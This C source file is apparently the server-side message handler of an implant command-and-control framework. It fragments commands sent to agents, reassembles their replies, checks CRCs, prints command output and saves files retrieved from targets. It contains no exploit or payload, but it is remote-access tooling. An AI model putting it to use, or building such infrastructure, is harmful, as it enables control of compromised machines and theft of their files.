/*
message_handler.c

This file is responsible for the following:
* fragmenting messages that are being sent out
* assembling fragmented messages from agents
* handling alive messages
* passing messages to and from console

*/

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <pthread.h>
#include <string.h>
#include <stdbool.h>
#include <signal.h>

#include <arpa/inet.h>

#include "crc32.h"

#include "utility.h"
#include "queue.h"
#include "implant.h"
#include "base.h"
#include "listener_handler.h"

// Globals
// Receive Queue
extern Queue* listener_receive_queue;
extern pthread_mutex_t listener_receive_queue_lock;
// Send Queue
extern Queue* listener_send_queue;
extern pthread_mutex_t listener_send_queue_lock;
// SIGINT flag
extern volatile sig_atomic_t all_sigint;
extern volatile sig_atomic_t shell_sigint;

// Status messages
Status_Message message_map[] = {
	{STATUS_ERROR,				"agent error"},
	{STATUS_MESSAGE_ORDER,		"fragments out of order"},
	{STATUS_FILE_EXIST,			"file doesn't exist"},
	{STATUS_PATH_EXIST,			"path doesn't exist"},
	{STATUS_FILE_ACCESS,		"cannot access file"},
	{STATUS_MESSAGE_INCOMPLETE,	"incomplete message"},
	{STATUS_BAD_CRC,			"crc does not match"},
	{STATUS_UNKNOWN_MESSAGE,	"unknown message type"},
	{STATUS_FILE_PUT,			"file written to target"},
};

/* listener_handle_command
Print command output to console.

ARGUMENTS
	agent	- message instance that will maintain state of multiple fragments

DONE */
static void listener_handle_command(Agent* agent){
	print_out("%s", agent->message);
}

/* listener_handle_get_file_name
Copy file name to agent->file_name.

ARGUMENTS
	agent	- message instance that will maintain state of multiple	fragments

DONE */
static void listener_handle_get_file_name(Agent* agent){

	if (agent->file_name != NULL) free(agent->file_name);

	agent->file_name = agent->message;
	agent->message = NULL;

	debug_print("Get file name: %s\n", agent->file_name);
}

/* listener_handle_get_file
Copy file contents to current directory.

ARGUMENTS
	agent	- message instance that will maintain state of multiple
				fragments

RETURN
	RET_ERROR	- agent->file_name is not set, cannot access fule, or write
					error
	RET_OK

DONE */
static int listener_handle_get_file(Agent* agent){
	int retval = RET_OK;
	FILE* file_fd;

	if (agent->file_name == NULL){
		debug_print("%s\n", "file name not set");
		retval = RET_ERROR;
		goto done;
	}

	if ((file_fd = fopen(agent->file_name, "wb")) == 0){
		debug_print("could not open file: %s\n", agent->file_name);
		retval = RET_ERROR;
		goto done;
	}

	if (writeall(file_fd, agent->message, agent->last_header.total_size) != RET_OK){
		debug_print("%s\n", "error writing file");
		retval = RET_ERROR;
		goto done_fp;
	}

	debug_print("Get file: %s, size: %d\n", agent->file_name, agent->last_header.total_size);

done_fp:
	fclose(file_fd);
done:
	free(agent->file_name);
	agent->file_name = NULL;
	return retval;
}

/* listener_parse_first_fragment
If this is the first fragment of a multi fragment message, check if the order
is correct and initiate the agent fields.

ARGUMENTS
	agent		- message instance that will maintain state of multiple
				  fragments
	fragment	- the fragment we are handling at this time
	size		- size of fragment

RETURN
	RET_ERROR 			- fragments received out of order
	RET_FATAL_ERROR		- cannot allocate memory
	RET_OK

DONE */
static int listener_parse_first_fragment(Agent* agent, Fragment* fragment, int32_t size){

	// check if this is a first fragment
	if (fragment->header.index != 0){
		debug_print("Expected first fragment but got: %d\n", fragment->header.index);
		return RET_ERROR;
	}

	// check if this fragment contains no data
	if (size != HEADER_SIZE){
		debug_print("Expected first fragment size 0 but got: %d\n", size);
		return RET_ERROR;
	}

	debug_print("Handling first fragment: type: %d\n", fragment->header.type);

	// save fragment to agent struct
	memcpy(&agent->last_header, fragment, HEADER_SIZE);
	
	// allocate memory for total message
	if (agent->message != NULL) free(agent->message);
	if ((agent->message = calloc(1, fragment->header.total_size)) == NULL) return RET_FATAL_ERROR;
	
	// record current size of message
	agent->current_message_size = 0;

	return RET_OK;
}

/* listener_parse_next_fragment
If this is not the next fragment of a multi fragment message, check if the
order is correct, update a_message fields, and copy fragment to message
buffer.

ARGUMENTS
	agent		- message instance that will maintain state of multiple
				  fragments
	fragment	- the fragment we are handling at this time
	size		- size of fragment

RETURN
	RET_ERROR 	- fragments received out of order
	RET_OK

DONE */
static int listener_parse_next_fragment(Agent* agent, Fragment* fragment, int size){

	// check if this fragment matches the next expected sized
	if (size - HEADER_SIZE != agent->last_header.next_size){
		debug_print("Expected fragment size: %d, but got: %d\n", size - HEADER_SIZE, agent->last_header.next_size);
		return RET_ERROR;
	}

	// check if type, checksum, and index match
	if (fragment->header.type != agent->last_header.type || \
		fragment->header.checksum != agent->last_header.checksum || \
		fragment->header.index != agent->last_header.index + 1){
		debug_print("Unexpected fragment: type: %d, checksum: %d, index: %d\n", \
			fragment->header.type, \
			fragment->header.checksum, \
			fragment->header.index);
		return RET_ERROR;
	}
	
	// copy payload to end of message buffer
	memcpy(agent->message + agent->current_message_size, fragment->buffer, agent->last_header.next_size);
	
	// update current size of message
	agent->current_message_size += agent->last_header.next_size;

	// update agent's last header
	memcpy(&agent->last_header, fragment, HEADER_SIZE);

	return RET_OK;
}

/* listener_handle_message_fragment
Determine if we need to parse first fragment or a follow up fragment.

ARGUMENTS
	agent		- message instance that will maintain state of multiple
				  fragments
	q_message	- message from receive queue

DONE */
static int listener_handle_message_fragment(Agent* agent, Queue_Message* q_message){
	int retval;

	// handle message type other than keep alive
	if (agent->last_header.index == -1){
		retval = listener_parse_first_fragment(agent, q_message->fragment, q_message->size);
	}
	else{
		retval = listener_parse_next_fragment(agent, q_message->fragment, q_message->size);
	}

	return retval;
}

/* listener_handle_complete_message
Once all fragments are received, check crc and pass message to proper message
handler.

ARGUMENTS
	agent	- message instance that will maintain state of multiple
			  fragments

RETURN
	RET_ERROR	- crc doesn't match or unknown message type received
	RET_OK

DONE */
static int listener_handle_complete_message(Agent* agent){
	int retval = RET_OK;
	uint32_t crc;

	// check if checksum matches message
	if ((crc = calculate_crc32c(0, (unsigned char*)agent->message, agent->current_message_size)) != agent->last_header.checksum ){
		debug_print("%s\n", "CRCs don't match");
		return RET_ERROR;
	}

	switch(agent->last_header.type){
		case TYPE_COMMAND:
			listener_handle_command(agent);
			break;
		case TYPE_GET_FILE_NAME:
			listener_handle_get_file_name(agent);
			break;
		case TYPE_GET_FILE:
			retval = listener_handle_get_file(agent);
			break;
		default:
			debug_print("unknown message type: %d\n", agent->last_header.type);
			retval = RET_ERROR;
	}

	return retval;
}

/* listener_handle_message
Dequeue fragment from receive queue and handle the fragment. If this is the
last fragment in the complete message, handle the complete message.

ARGUMENTS
	a_message	- message instance that will maintain state of multiple
				  fragments

DONE */
static int listener_handle_message(Connected_Agents* CA){
	int retval = RET_OK;
	Queue_Message* q_message;
	Agent* agent;

	pthread_mutex_lock(&listener_receive_queue_lock);
	q_message = dequeue(listener_receive_queue);
	pthread_mutex_unlock(&listener_receive_queue_lock);

	if (!q_message) return RET_OK;
	debug_print("taking message off queue: id: %d, size: %d\n", q_message->id, q_message->size);

	agent = &CA->agents[q_message->id];

	pthread_mutex_lock(&CA->lock);
	// check if socket file descriptor was removed from agents global variable
	if (!agent->alive){
		debug_print("%s\n", "agent was disconnected");
		goto done;
	}

	// if type is alive packet, update keep alive parameter
	if (q_message->fragment->header.type == TYPE_ALIVE){
		CA->agents[q_message->id].alive = (unsigned int)time(NULL);
		debug_print("Agent %d is alive: %u seconds\n", q_message->id, q_message->fragment->header.alive_time);
		goto done;
	}

	// if type is response packet, print update to stdout
	if (q_message->fragment->header.type == TYPE_RESPONSE){
		for (Status_Message* stat_msg = message_map; stat_msg != message_map + 1; stat_msg++){
			if (stat_msg->index == q_message->fragment->header.response_id){
				printf("RESPONSE: %s\n", stat_msg->msg);
			}
		}
		goto done;
	}

	// check response from fragment handler
	if ((retval = listener_handle_message_fragment(agent, q_message)) != RET_OK){
		if (agent->message != NULL){
			free(agent->message);
			agent->message = NULL;
		}
		if (agent->file_name != NULL){
			free(agent->file_name);
			agent->file_name = NULL;
		}
		agent->last_header.index = -1;
		goto done;
	}

	// check if we received all fragments and handle completed message
	if (agent->last_header.index != -1 && agent->last_header.total_size == agent->current_message_size){
		retval = listener_handle_complete_message(agent);
		if (agent->message != NULL){
			free(agent->message);
			agent->message = NULL;
		}
		agent->last_header.index = -1;
	}

done:
	pthread_mutex_unlock(&CA->lock);
	free(q_message->fragment);
	free(q_message);
	return retval;
}

void listener_prepare_message(int sockfd, int type, char* message, int message_size){
	Queue_Message* q_message;
	Fragment* fragment;
	int bytes_sent = 0, index = 0;
	int this_size, next_size;
	uint32_t crc = calculate_crc32c(0, (unsigned char*)message, message_size);

	// prepare first fragment. Only purpose is to prepare for next fragment size
	fragment = calloc(1, sizeof(Fragment));
	fragment->header.type = type;
	fragment->header.index = index++;
	fragment->header.total_size = message_size;
	fragment->header.checksum = crc;
	
	next_size = message_size < PAYLOAD_SIZE ? message_size : PAYLOAD_SIZE;
	fragment->header.next_size = next_size;
	
	q_message = malloc(sizeof(Queue_Message));
	q_message->id = sockfd;
	q_message->size = HEADER_SIZE;
	q_message->fragment = fragment;

	pthread_mutex_lock(&listener_send_queue_lock);
	enqueue(listener_send_queue, q_message);
	
	while (next_size > 0){
		this_size = next_size;

		// send remaining fragments
		fragment = calloc(1, sizeof(Fragment));
		fragment->header.type = type;
		fragment->header.index = index++;
		fragment->header.total_size = message_size;
		fragment->header.checksum = crc;

		next_size = (message_size - (bytes_sent + next_size)) < PAYLOAD_SIZE ? (message_size - (bytes_sent + next_size)) : PAYLOAD_SIZE;
		fragment->header.next_size = next_size;
		memcpy(fragment->buffer, message + bytes_sent, this_size);
		
		q_message = malloc(sizeof(Queue_Message));
		q_message->id = sockfd;
		q_message->size = HEADER_SIZE + this_size;
		q_message->fragment = fragment;

		enqueue(listener_send_queue, q_message);
		bytes_sent += this_size;
	}
	pthread_mutex_unlock(&listener_send_queue_lock);
}

/* listener_handler_thread
Thread main for listener handler. This function will continuously loop and pull
messages off the receive queue for processing. Only stop if the listener is
shutting down.

ARGUMENTS
	vargp (Connected_Agents)	- main function structure that will store
								  information on all agents

DONE */
void *listener_handler_thread(void *vargp){
	Connected_Agents* CA = vargp;

	while(!all_sigint){
		if (listener_handle_message(CA) == RET_FATAL_ERROR){
			printf("ERROR listener_handler_thread\n");
			all_sigint = true;
		}
	}

	debug_print("%s\n", "listener_handler_thread done");
	return 0;
}